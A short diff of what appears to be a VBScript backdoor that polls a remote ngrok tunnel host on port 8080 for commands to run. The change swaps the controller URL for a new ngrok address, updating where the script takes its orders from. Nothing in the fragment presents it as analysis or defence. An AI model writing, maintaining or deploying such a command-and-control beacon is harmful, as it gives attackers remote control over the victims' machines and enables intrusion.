@@ -30,7 +30,7 @@ Dim strHost, strPort, strUrl, strCD, intSleep
 strHost = "be5e-131-123-186-72.ngrok.io"
 strPort = "8080"
 intSleep = 5000
-strUrl = "https://be5e-131-123-186-72.ngrok.io"
+strUrl = "https://d0d3-131-123-186-72.ngrok.io"
 strCD =  "."
 
 ' Periodically poll for commands
